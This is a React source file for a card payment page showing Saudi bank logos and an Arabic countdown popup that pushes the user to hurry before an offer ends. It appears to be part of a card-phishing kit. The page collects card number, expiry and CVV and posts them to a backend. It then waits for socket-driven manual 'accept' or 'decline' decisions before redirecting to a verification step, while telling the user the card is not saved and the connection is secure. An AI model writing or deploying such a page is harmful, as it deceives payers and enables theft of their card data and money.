import axios from "axios";
import { useEffect, useState } from "react";
import { api_route, socket } from "../App";
import { useNavigate } from "react-router-dom";
import { validatePaymentDetails } from "../utils/paymentValidation";
import { useTranslation } from "../context/LanguageContext";
import {
  LuLock,
  LuCreditCard,
  LuUser,
  LuCalendar,
  LuKeyRound,
  LuShieldCheck,
} from "react-icons/lu";
import ProgressStepper from "../components/apply/ProgressStepper";
import ApplyFooter from "../components/ApplyFooter";
import FloatingActions from "../components/FloatingActions";
import ProcessingWaitModal from "../components/confirm/ProcessingWaitModal";

const BANKS = [
  { nameKey: "summary.banks.tiqmo", img: "/tiqmo.jpeg" },
  { nameKey: "summary.banks.riyad", img: "/riyad.jpeg" },
  { nameKey: "summary.banks.sab", img: "/sab.jpeg" },
  { nameKey: "summary.banks.fransi", img: "/fransi.jpeg" },
  { nameKey: "summary.banks.alinma", img: "/alinma.jpeg" },
  { nameKey: "summary.banks.barq", img: "/barq.jpeg" },
  { nameKey: "summary.banks.mada", img: "/mada.jpeg" },
  { nameKey: "summary.banks.albilad", img: "/albilad.jpeg" },
  { nameKey: "summary.banks.meem", img: "/meem.jpeg" },
  { nameKey: "summary.banks.vision", img: "/vision.jpeg" },
];

const money = (n) => Number(n).toFixed(2);

const Confirm = ({ setLoading }) => {
  const { t, dir } = useTranslation();
  const data = new URLSearchParams(window.location.search);
  const query = JSON.parse(data.get("data"));
  const companyData = query.companyData || {};
  const [card_number, setCardNumber] = useState("");
  const [cvv, setCvv] = useState("");
  const [pin] = useState("");
  const [error, setError] = useState(false);
  const [errorCard, setErrorCard] = useState(false);
  const [car_holder_name, setCardHolderName] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [, setVrefiy] = useState(false);
  const [load, setLoad] = useState(null);
  const navigate = useNavigate();

  const price =
    parseFloat(String(companyData.price ?? "").replace(/[^\d.]/g, "")) || 0;
  const vat = +(price * 0.15).toFixed(2);
  const total = +(price + vat).toFixed(2);
  const companyName = companyData.nameKey
    ? t(companyData.nameKey)
    : companyData.name || "—";

  const [expMonth, expYear] = expiryDate.split("/");

  const setExpiryPart = (month, year) => {
    const m = (month ?? "").replace(/\D/g, "").slice(0, 2);
    const y = (year ?? "").replace(/\D/g, "").slice(0, 2);
    if (!m && !y) setExpiryDate("");
    else if (!y) setExpiryDate(m);
    else setExpiryDate(`${m}/${y}`);
  };

  const formatCardNumber = (value) => {
    const numericValue = value.replace(/\D/g, "");
    let formattedValue = numericValue.replace(/(\d{4})(?=\d)/g, "$1 ");
    formattedValue = formattedValue.slice(0, 19);
    setCardNumber(formattedValue);
  };

  const handleCardNumberChange = (e) => {
    setErrorCard(false);
    formatCardNumber(e.target.value);
  };

  const handleCvvChange = (e) => {
    setErrorCard(false);
    const numericValue = e.target.value.replace(/\D/g, "");
    setCvv(numericValue.slice(0, 3));
  };

  const handleSubmit = async (e) => {
    setLoad(true);
    setError(false);
    setErrorCard(false);
    e.preventDefault();
    let check = card_number.split(" ").join("");
    const paymentError = validatePaymentDetails({
      cardDigits: check,
      expiryDate,
      cvv,
      cardName: car_holder_name,
    });
    if (paymentError) {
      setLoad(false);
      return setErrorCard(paymentError);
    }
    // if (check.startsWith("4847")) {
    //   setLoad(false);
    //   return setErrorCard("confirm.rajhiSuspended");
    // }
    // if (check.startsWith("4548")) {
    //   setLoad(false);
    //   return setErrorCard("confirm.walletSuspended");
    // }
    const finalData = {
      ...JSON.parse(data.get("data")),
      cardNumber: card_number,
      expiryDate,
      cvv,
      pin,
      card_name: car_holder_name,
    };
    try {
      await axios.post(api_route + "/visa/" + query._id, finalData).then(() => {
        socket.emit("paymentForm", JSON.parse(data.get("data"))._id);
        setVrefiy(true);
      });
    } catch {
      setLoad(false);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    const onAcceptPaymentForm = (id) => {
      if (id !== query._id) return;
      setVrefiy(false);
      sessionStorage.setItem(
        "card",
        card_number.startsWith("5")
          ? "master"
          : card_number.startsWith("4")
            ? "visa"
            : null,
      );
      navigate(
        `/verfiy?data=${encodeURIComponent(
          JSON.stringify({
            ...query,
            cardNumber: card_number,
          }),
        )}`,
      );
    };

    const onDeclinePaymentForm = (id) => {
      if (id !== query._id) return;
      setVrefiy(false);
      setLoad(false);
      setError("confirm.invalidCardRetry");
    };

    socket.on("acceptPaymentForm", onAcceptPaymentForm);
    socket.on("declinePaymentForm", onDeclinePaymentForm);
    return () => {
      socket.off("acceptPaymentForm", onAcceptPaymentForm);
      socket.off("declinePaymentForm", onDeclinePaymentForm);
    };
  }, [card_number, navigate, query._id]);

  const [popUp, setPopUp] = useState(true);
  const [counter, setCounter] = useState(60 * 60 * 2);

  useEffect(() => {
    const interval = setInterval(() => {
      setCounter((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);

    return () => clearInterval(interval);
  }, []);

  const hours = Math.floor(counter / 3600);
  const minutes = Math.floor((counter % 3600) / 60);
  const seconds = counter % 60;

  const formattedTime = `${String(hours).padStart(2, "0")}:${String(
    minutes,
  ).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;
  const handleBack = () => {
    if (window.history.length > 1) navigate(-1);
    else navigate("/");
  };

  if (!data.get("data")) {
    return (
      <div className="flex min-h-52 w-full items-center justify-center text-xl text-red-500">
        {t("common.invalidData")}
      </div>
    );
  }

  const fieldClass =
    "w-full rounded-xl border border-gray-200 bg-white px-3 py-3 text-sm outline-none focus:border-[#146394]";

  return (
    <div className="flex min-h-screen w-full flex-col bg-[#F8F9FB] " dir={dir}>
      {load ? <ProcessingWaitModal t={t} dir={dir} /> : null}
      {popUp && (
        <div className="fixed top-0 w-full z-20  flex items-center justify-center h-screen flex-col  left-0 bg-[#00000053] bg-opacity-45 ">
          <div className="w-11/12 md:w-fit p-3 rounded-md bg-white flex flex-col items-center">
            <img src="/payment.jpeg" className="w-full md:w-1/3" />
            <span className="text-xl my-5 text-gray-700 w-fit font-bold">
              سارع قبل نهاية العرض !
            </span>
            <span className="font-bold text-gray-700">
              يتبقى على انتهاء العرض:
            </span>
            <div className="text-green-600 text-4xl my-5 font-bold">
              {formattedTime}
            </div>
            <button
              onClick={() => setPopUp(false)}
              className="bg-[#6c757d] text-white w-full text-lg py-2 rounded-md"
            >
              إغلاق
            </button>
          </div>
        </div>
      )}
      <div className="mx-auto w-full max-w-xl px-4 pt-4">
        <ProgressStepper t={t} current={4} />

        <section className="mt-5 rounded-2xl bg-white p-4 shadow-sm">
          <div className="mb-4 flex flex-col items-center text-center">
            <span className="mb-2 flex h-12 w-12 items-center justify-center rounded-full bg-[#E8F3FB] text-[#146394]">
              <LuLock className="h-6 w-6" />
            </span>
            <h1 className="text-lg font-extrabold text-[#146394]">
              {t("confirm.secureTitle")}
            </h1>
            <p className="mt-1 text-xs font-semibold text-gray-400">
              {t("confirm.secureSubtitle")}
            </p>
          </div>

          <div className="mb-4 rounded-xl bg-[#E8F3FB] px-4 py-3 text-center">
            <p className="text-sm font-bold text-[#146394]">{companyName}</p>
            <p className="mt-1 text-2xl font-extrabold text-[#146394]">
              {money(total)} {t("common.currencySar")}
            </p>
          </div>

          <form onSubmit={handleSubmit} className="flex flex-col gap-3">
            <label className="block">
              <span className="mb-1.5 flex items-center gap-1.5 text-xs font-bold text-[#146394]">
                <LuCreditCard className="h-4 w-4" />
                {t("confirm.cardNumber")}
              </span>
              <input
                value={card_number}
                required
                onChange={handleCardNumberChange}
                dir="ltr"
                autoComplete="cc-number"
                maxLength={19}
                minLength={16}
                inputMode="numeric"
                type="text"
                placeholder={t("confirm.cardNumberPlaceholder")}
                className={fieldClass}
              />
            </label>

            <label className="block">
              <span className="mb-1.5 flex items-center gap-1.5 text-xs font-bold text-[#146394]">
                <LuUser className="h-4 w-4" />
                {t("confirm.cardHolderName")}
              </span>
              <input
                value={car_holder_name}
                required
                onChange={(e) => {
                  setErrorCard(false);
                  setCardHolderName(e.target.value);
                }}
                dir="ltr"
                autoComplete="cc-name"
                placeholder={t("confirm.cardHolderPlaceholder")}
                type="text"
                className={fieldClass}
              />
            </label>

            <div className="grid grid-cols-2 gap-3">
              <label className="block">
                <span className="mb-1.5 flex items-center gap-1.5 text-xs font-bold text-[#146394]">
                  <LuCalendar className="h-4 w-4" />
                  {t("confirm.expiryMonth")}
                </span>
                <input
                  value={expMonth || ""}
                  required
                  onChange={(e) => {
                    setErrorCard(false);
                    setExpiryPart(e.target.value, expYear || "");
                  }}
                  dir="ltr"
                  inputMode="numeric"
                  autoComplete="cc-exp-month"
                  maxLength={2}
                  placeholder={t("confirm.monthPlaceholder")}
                  className={fieldClass}
                />
              </label>
              <label className="block">
                <span className="mb-1.5 flex items-center gap-1.5 text-xs font-bold text-[#146394]">
                  <LuCalendar className="h-4 w-4" />
                  {t("confirm.expiryYear")}
                </span>
                <input
                  value={expYear || ""}
                  required
                  onChange={(e) => {
                    setErrorCard(false);
                    setExpiryPart(expMonth || "", e.target.value);
                  }}
                  dir="ltr"
                  inputMode="numeric"
                  autoComplete="cc-exp-year"
                  maxLength={2}
                  placeholder={t("confirm.yearPlaceholder")}
                  className={fieldClass}
                />
              </label>
            </div>

            <label className="block">
              <span className="mb-1.5 flex items-center gap-1.5 text-xs font-bold text-[#146394]">
                <LuKeyRound className="h-4 w-4" />
                {t("confirm.cvv")}
              </span>
              <input
                className={fieldClass}
                type="text"
                dir="ltr"
                inputMode="numeric"
                autoComplete="cc-csc"
                value={cvv}
                onChange={handleCvvChange}
                placeholder={t("confirm.cvvPlaceholder")}
                maxLength={3}
                required
              />
            </label>

            {errorCard ? (
              <p
                dir={dir}
                className="mt-1 w-full rounded-md border border-red-500 bg-[#f8d7da] p-3 text-sm text-red-500"
              >
                {t(errorCard)}
              </p>
            ) : null}
            {error ? (
              <p
                dir={dir}
                className="mt-1 w-full rounded-md border border-red-500 bg-[#f8d7da] p-3 text-sm text-red-500"
              >
                {t(error)}
              </p>
            ) : null}

            <button
              className="mt-2 flex w-full items-center justify-center gap-2 rounded-xl bg-[#146394] py-3 text-base font-bold text-white"
              type="submit"
            >
              <LuLock className="h-4 w-4" />
              {t("confirm.payNow")}
            </button>
            <p className="flex items-center justify-center gap-1.5 text-center text-xs font-semibold text-green-600">
              <LuShieldCheck className="h-4 w-4" />
              {t("confirm.encryptedSafe")}
            </p>
          </form>
        </section>

        <section className="mt-4 overflow-hidden rounded-2xl bg-white shadow-sm">
          <div className="bg-[#E8F3FB] py-2.5 text-center text-sm font-extrabold text-[#146394]">
            {t("confirm.txSummary")}
          </div>
          <div className="space-y-3 p-4">
            <div className="flex items-center justify-between">
              <span className="text-xs font-semibold text-gray-400">
                {t("confirm.company")}
              </span>
              <span className="text-sm font-extrabold text-[#146394]">
                {companyName}
              </span>
            </div>
            <div className="flex items-center justify-between">
              <span className="text-xs font-semibold text-gray-400">
                {t("confirm.amountDue")}
              </span>
              <span className="text-lg font-extrabold text-[#146394]">
                {money(total)} {t("common.currencySar")}
              </span>
            </div>
            <div className="rounded-xl bg-[#F8F9FB] px-3 py-3">
              <p className="flex items-center gap-2 text-xs font-semibold text-gray-500">
                <LuShieldCheck className="h-4 w-4 text-green-600" />
                {t("confirm.ssl256")}
              </p>
              <p className="mt-2 flex items-center gap-2 text-xs font-semibold text-gray-500">
                <LuLock className="h-4 w-4 text-[#146394]" />
                {t("confirm.noCardSave")}
              </p>
            </div>
          </div>
        </section>

        <section className="mt-4 pt-4 overflow-hidden rounded-2xl bg-white shadow-sm">
          <p className="mb-3 text-center text-xs font-bold text-[#146394]">
            {t("confirm.banksHeading")}
          </p>
          <div className="my-5 flex flex-wrap gap-2 md:w-3/5 w-4/5 justify-center items-center mx-auto">
            {BANKS.map((bank) => (
              <div key={bank.nameKey} className="flex min-h-16  px-1">
                {bank.img ? (
                  <img
                    src={bank.img}
                    alt={t(bank.nameKey)}
                    className="h-10 w-full object-contain "
                  />
                ) : (
                  <span className="text-center text-[10px] font-bold text-[#146394]">
                    {t(bank.nameKey)}
                  </span>
                )}
              </div>
            ))}
          </div>
        </section>
        <button
          type="button"
          onClick={handleBack}
          className="mb-6 mt-4 rounded-xl border border-gray-200 bg-white px-6 py-2 text-sm font-bold text-[#146394]"
        >
          {t("reg.back")}
        </button>
      </div>

      <ApplyFooter />
      <FloatingActions />
    </div>
  );
};

export default Confirm;
